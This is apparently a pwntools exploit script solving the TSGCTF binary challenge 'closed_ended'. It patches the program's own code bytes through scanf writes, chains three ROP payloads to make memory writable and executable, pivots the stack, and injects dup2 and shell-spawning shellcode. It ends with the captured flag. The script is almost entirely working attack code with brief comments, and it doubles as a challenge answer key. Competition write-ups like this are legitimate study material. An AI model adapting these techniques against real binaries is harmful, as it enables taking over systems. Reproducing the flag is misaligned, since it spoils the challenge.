from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

p = gdb.debug('./closed_ended', '''
    b *0x4010b4
    continue
''')

# p = remote('34.84.25.24', 50037)

JNE_0X401117 = 0x4010b4
RETN = 0x4010b9
MOV_EDX_0X5 = 0x4010f1

MAIN = 0x401070
SCANF_P = 0x4010ba
SCANF_100S = 0x401105

PIVOT_TO = 0x401600
FAKE_RBP = 0x401f00

# 1. first ROP
# first ELF memory overwrite to make program return correctly even though canary check fails
'''
before:
004010b4  7561               jne     0x401117

execute:
scanf("%p", &addr);
scanf("%*c%c", (char*)addr);

after:
004010b4  7500               jne     0x4010b6
'''
p.sendline(str(hex(JNE_0X401117+1)).encode())
p.sendline(b'\x00')
# prepare for second ROP
'''
execute:
mprotect((void*)0x401000, 0x1000, PROT_READ | PROT_EXEC);
scanf("%100s", buf);

first ROP chain:
FAKE_RBP: rbp=0x401f00
MAIN: mprotect((void*)0x401000, 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC); close(1); return 0;
RETN: 0x10 alignment for rsp, otherwise scanf fails later
SCANF_P: second ELF memory overwrite and second ROP
'''
p.sendline(b'A'*0x12+p64(FAKE_RBP)+p64(MAIN)+p64(RETN)+p64(SCANF_P))

# 2. second ROP
# second ELF memory overwrite to make program always execute mprotect with 0x7 as third argument
'''
before:
004010f1  ba05000000         mov     edx, 0x5

execute:
scanf("%p", &addr);
scanf("%*c%c", (char*)addr);

after:
004010f1  ba07000000         mov     edx, 0x7
'''
p.sendline(str(hex(MOV_EDX_0X5+1)).encode())
p.sendline(b'\x07')
# prepare for third ROP
'''
execute:
mprotect((void*)0x401000, 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC);
scanf("%100s", buf);

second ROP chain:
PIVOT_TO-8: stack pivot to 0x401600
SCANF_100S: third ROP
'''
p.sendline(b'A'*0x12+p64(PIVOT_TO-8)+p64(SCANF_100S))

# 3. third ROP
# inject shellcode to RWX ELF memory
'''
execute:
scanf("%100s", buf);

third ROP chain:
PIVOT_TO+8: shellcode start address
shellcode: dup2(2, 1); sh(); because of close(1);
'''
p.sendline(b'A'*0x1a+p64(PIVOT_TO+8)+asm(shellcraft.dup2(2, 1)+shellcraft.sh()))

p.interactive()

# TSGCTF{3sc4ped_c105e_m3men7o_v1v3r3_4e80ef421b2bcd3ae38cda}